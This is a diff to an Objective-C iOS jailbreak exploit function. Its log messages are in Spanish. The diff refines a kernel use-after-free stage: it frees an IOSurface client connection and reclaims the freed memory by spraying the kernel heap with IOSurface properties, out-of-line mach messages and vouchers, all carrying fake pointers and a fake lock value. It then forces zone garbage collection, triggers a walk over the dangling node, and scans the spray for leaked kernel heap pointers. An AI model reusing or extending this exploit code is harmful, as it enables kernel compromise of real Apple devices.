@@ -26927,10 +26927,13 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                     sym.close(cDangle);
                     usleep(5000);
 
-                    log(@"[JB22] Client liberado. Spray de IOSurfaces para reclamar su memoria...");
+                    log(@"[JB22] Client liberado. Spray kalloc multi-tamaño para reclamar...");
+
+                    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+                    SetValueFn setValue = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
 
                     NSDictionary *surfParams = isr_default_surface_params(64, 4);
-                    int sprayCount = 128;
+                    int sprayCount = 256;
                     IOSurfaceRef *spray = (IOSurfaceRef *)calloc((size_t)sprayCount, sizeof(IOSurfaceRef));
                     if (spray) {
                         for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
@@ -26939,38 +26942,88 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                         }
                         log([NSString stringWithFormat:@"[JB22] Spray: %d/%d surfaces creadas", sprayHits, sprayCount]);
 
-                        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
-                        SetValueFn setValue = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
-
+                        int kallocHits = 0;
                         if (setValue) {
-                            uint8_t payload[256];
-                            memset(payload, 0x42, sizeof(payload));
-                            uint64_t fakePtr = 0x4141414141414141ULL;
-                            for (int off = 0; off < 256; off += 8) {
-                                memcpy(payload + off, &fakePtr, 8);
-                            }
-                            NSData *payloadData = [NSData dataWithBytes:payload length:sizeof(payload)];
-
-                            for (int i = 0; i < sprayCount; i++) {
-                                if (!spray[i]) continue;
-                                for (int k = 0; k < 8; k++) {
-                                    NSString *key = [NSString stringWithFormat:@"JBPAD%d_%d", i, k];
-                                    setValue(spray[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)payloadData);
+                            int sizes[] = { 128, 256, 512, 1024 };
+                            for (int si = 0; si < 4; si++) {
+                                int sz = sizes[si];
+                                uint8_t *payload = (uint8_t *)calloc(1, (size_t)sz);
+                                if (!payload) continue;
+                                uint64_t fakePtr = 0x4141414141414141ULL;
+                                for (int off = 0; off < sz; off += 8) {
+                                    memcpy(payload + off, &fakePtr, 8);
                                 }
+                                if (sz >= 0xd8 + 8) {
+                                    uint64_t fakeLock = 0x4242424242424242ULL;
+                                    memcpy(payload + 0xd8, &fakeLock, 8);
+                                }
+                                NSData *payloadData = [NSData dataWithBytes:payload length:(NSUInteger)sz];
+                                for (int i = 0; i < sprayCount; i++) {
+                                    if (!spray[i]) continue;
+                                    NSString *key = [NSString stringWithFormat:@"JBK%d_%d", sz, i];
+                                    setValue(spray[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)payloadData);
+                                    kallocHits++;
+                                }
+                                free(payload);
                             }
-                            log(@"[JB22] Payload 0x4141414141414141 escrito en todas las surfaces");
+                            log([NSString stringWithFormat:@"[JB22] Kalloc spray: %d propiedades (4 tamaños × %d surfaces)", kallocHits, sprayCount]);
                         } else {
-                            log(@"[JB22] AVISO: IOSurfaceSetValue no disponible — spray sin payload");
+                            log(@"[JB22] AVISO: IOSurfaceSetValue no disponible");
                         }
 
-                        log(@"[JB22] Fase 3: Voucher spray para cubrir más zonas kalloc...");
+                        log(@"[JB22] Fase 3: OOL mach msg spray para kalloc adicional...");
+                        int oolHits = 0;
+                        mach_port_t *oolPorts = (mach_port_t *)calloc(256, sizeof(mach_port_t));
+                        if (oolPorts) {
+                            for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                                mach_port_t p = MACH_PORT_NULL;
+                                kern_return_t kra = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+                                if (kra != KERN_SUCCESS) continue;
+                                mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+                                oolPorts[i] = p;
+
+                                struct {
+                                    mach_msg_header_t hdr;
+                                    mach_msg_body_t body;
+                                    mach_msg_ool_descriptor_t ool;
+                                } msg;
+                                memset(&msg, 0, sizeof(msg));
+                                uint8_t oolBuf[256];
+                                uint64_t fp = 0x4141414141414141ULL;
+                                for (int off = 0; off < 256; off += 8) memcpy(oolBuf + off, &fp, 8);
+                                if (256 >= 0xd8 + 8) {
+                                    uint64_t fl = 0x4242424242424242ULL;
+                                    memcpy(oolBuf + 0xd8, &fl, 8);
+                                }
+
+                                msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                                msg.hdr.msgh_size = (mach_msg_size_t)sizeof(msg);
+                                msg.hdr.msgh_remote_port = p;
+                                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                                msg.hdr.msgh_id = 0x41414141;
+                                msg.body.msgh_descriptor_count = 1;
+                                msg.ool.address = oolBuf;
+                                msg.ool.size = 256;
+                                msg.ool.deallocate = 0;
+                                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                                kern_return_t krs = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                    (mach_msg_size_t)sizeof(msg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                                if (krs == KERN_SUCCESS) oolHits++;
+                            }
+                            log([NSString stringWithFormat:@"[JB22] OOL spray: %d/256 mensajes enviados", oolHits]);
+                        }
+
+                        log(@"[JB22] Fase 4: Voucher spray diagnóstico...");
                         typedef kern_return_t (*HostCreateVoucherFn)(host_t, mach_voucher_attr_raw_recipe_array_t, mach_msg_type_number_t, mach_voucher_t *);
                         HostCreateVoucherFn hostCreate = (HostCreateVoucherFn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
                         mach_voucher_t *vouchers = NULL;
-                        int vCount = 512;
+                        int vCount = 64;
                         if (hostCreate) {
                             vouchers = (mach_voucher_t *)calloc((size_t)vCount, sizeof(mach_voucher_t));
                             if (vouchers) {
+                                kern_return_t lastKr = 0;
                                 for (int i = 0; i < vCount && !isr_stopped(); i++) {
                                     uint8_t buf[16 + 64];
                                     memset(buf, 0, sizeof(buf));
@@ -26979,67 +27032,57 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                                     hdr[1] = 1;
                                     hdr[2] = 0;
                                     hdr[3] = 64;
-                                    uint64_t fp = 0x4141414141414141ULL;
-                                    for (int off = 0; off < 64; off += 8) {
-                                        memcpy(buf + 16 + off, &fp, 8);
-                                    }
-
+                                    memset(buf + 16, 0x43, 64);
                                     kern_return_t kr = hostCreate(mach_host_self(),
                                         (mach_voucher_attr_raw_recipe_array_t)buf,
                                         (mach_msg_type_number_t)sizeof(buf),
                                         &vouchers[i]);
                                     if (kr == KERN_SUCCESS) voucherHits++;
+                                    else lastKr = kr;
                                 }
-                                log([NSString stringWithFormat:@"[JB22] Voucher spray: %d/%d creados", voucherHits, vCount]);
+                                log([NSString stringWithFormat:@"[JB22] Voucher spray: %d/%d (lastKr=0x%x)", voucherHits, vCount, (uint32_t)lastKr]);
                             }
                         } else {
-                            log(@"[JB22] AVISO: host_create_mach_voucher no disponible");
+                            log(@"[JB22] host_create_mach_voucher: NULL");
                         }
 
                         typedef kern_return_t (*ZoneGCFn)(host_t);
                         ZoneGCFn gcFn = (ZoneGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
-                        if (gcFn) {
-                            kern_return_t gcr = gcFn(mach_host_self());
-                            log([NSString stringWithFormat:@"[JB22] mach_zone_force_gc: 0x%x", gcr]);
-                        }
+                        if (gcFn) gcFn(mach_host_self());
 
-                        log(@"[JB22] Fase 4: Trigger — crear nueva surface y liberar para provocar walk...");
+                        log(@"[JB22] Fase 5: Trigger — sel17 en nueva conexión para forzar walk de nodos...");
                         if (!isr_stopped()) {
+                            io_connect_t cTrig = 0;
+                            if (sym.open(svc, mach_task_self(), 0, &cTrig) == KERN_SUCCESS) {
+                                kern_return_t rTrig = jb20_call_sel(cTrig, 17, in3, 24, calibShape, asyncCall, sym.call);
+                                log([NSString stringWithFormat:@"[JB22] Trigger sel17 en nueva conexión: 0x%x", rTrig]);
+
+                                uint64_t db18t[3] = { 1, 2, 3 };
+                                kern_return_t rDT = sym.call(cTrig, 18, NULL, 0, db18t, 24, NULL, NULL, NULL, NULL);
+                                log([NSString stringWithFormat:@"[JB22] Trigger sel18 deregister: 0x%x", rDT]);
+                                sym.close(cTrig);
+                            }
+
                             IOSurfaceRef trigSurf = sym.create((__bridge CFDictionaryRef)surfParams);
                             if (trigSurf) {
                                 uint32_t gid = sym.getID(trigSurf);
                                 IOSurfaceRef s2 = sym.lookup(gid);
-                                log([NSString stringWithFormat:@"[JB22] Trigger surface: ID=%u lookup=%s", gid, s2 ? "OK" : "NULL"]);
-
-                                typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
-                                CopyAllFn copyAll = (CopyAllFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
-                                if (copyAll) {
-                                    CFTypeRef vals = copyAll(trigSurf);
-                                    if (vals) {
-                                        NSString *desc = [(__bridge id)vals description];
-                                        if (desc.length > 400) desc = [desc substringToIndex:400];
-                                        log([NSString stringWithFormat:@"[JB22] Trigger vals: %@", desc]);
-                                        CFRelease(vals);
-                                    }
-                                }
+                                log([NSString stringWithFormat:@"[JB22] Trigger surface ID=%u lookup=%s", gid, s2 ? "OK" : "NULL"]);
 
                                 usleep(50000);
                                 CFRelease(trigSurf);
-                                usleep(300000);
-
-                                if (s2) {
-                                    log(@"[JB22] Liberando segunda referencia → kernel walk sobre nodo colgante...");
-                                    CFRelease(s2);
-                                }
-                                log(@"[JB22] ★ Walk completado sin crash — kernel procesó el puntero colgante");
+                                usleep(200000);
+                                if (s2) CFRelease(s2);
+                                log(@"[JB22] ★ Walk completado sin crash");
                             }
                         }
 
-                        log(@"[JB22] Fase 5: Escaneo de punteros heap en surfaces del spray...");
+                        log(@"[JB22] Fase 6: Leer propiedades del spray buscando corrupción...");
                         if (!isr_stopped()) {
                             typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
                             CopyAllFn copyAll = (CopyAllFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
                             if (copyAll) {
+                                int corrupted = 0;
                                 for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
                                     if (!spray[i]) continue;
                                     CFTypeRef vals = copyAll(spray[i]);
@@ -27048,15 +27091,18 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                                         NSRange rng = [desc rangeOfString:@"0xffffff"];
                                         if (rng.location != NSNotFound) {
                                             heapPtrsFound++;
-                                            NSUInteger start = rng.location > 20 ? rng.location - 20 : 0;
-                                            NSUInteger end = rng.location + 30 < desc.length ? rng.location + 30 : desc.length;
-                                            log([NSString stringWithFormat:@"[JB22] ★ HEAP PTR en spray[%d]: ...%@...",
-                                                 i, [desc substringWithRange:NSMakeRange(start, end - start)]]);
+                                            NSUInteger s = rng.location > 20 ? rng.location - 20 : 0;
+                                            NSUInteger e = rng.location + 30 < desc.length ? rng.location + 30 : desc.length;
+                                            log([NSString stringWithFormat:@"[JB22] ★ HEAP PTR spray[%d]: ...%@...",
+                                                 i, [desc substringWithRange:NSMakeRange(s, e - s)]]);
+                                        }
+                                        if ([desc rangeOfString:@"4242424242424242"].location != NSNotFound) {
+                                            corrupted++;
                                         }
                                         CFRelease(vals);
                                     }
                                 }
-                                log([NSString stringWithFormat:@"[JB22] Heap pointers encontrados: %d/%d surfaces", heapPtrsFound, sprayHits]);
+                                log([NSString stringWithFormat:@"[JB22] Heap ptrs=%d corrupted=%d de %d surfaces", heapPtrsFound, corrupted, sprayHits]);
                             }
                         }
 
@@ -27064,6 +27110,13 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                             if (spray[i]) CFRelease(spray[i]);
                         }
                         free(spray);
+
+                        if (oolPorts) {
+                            for (int i = 0; i < 256; i++) {
+                                if (oolPorts[i]) mach_port_destroy(mach_task_self(), oolPorts[i]);
+                            }
+                            free(oolPorts);
+                        }
 
                         if (vouchers) {
                             for (int i = 0; i < vCount; i++) {
